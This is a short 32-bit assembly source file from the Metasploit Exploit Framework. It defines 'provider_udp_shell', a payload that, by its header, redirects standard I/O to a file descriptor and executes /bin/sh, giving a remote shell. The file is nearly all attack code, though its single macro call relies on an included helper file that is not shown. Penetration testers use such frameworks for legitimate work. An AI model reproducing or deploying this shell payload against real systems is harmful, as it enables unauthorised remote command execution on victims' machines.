;;
;
;        Name: provider_udp_shell
;        Type: Provider
;   Qualities: None
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload redirects stdio to a file descriptor and executes
;        /bin/sh.
;
;;
BITS   32
GLOBAL _start

%include "generic.asm"

_start:
	execve_binsh EXECUTE_REDIRECT_IO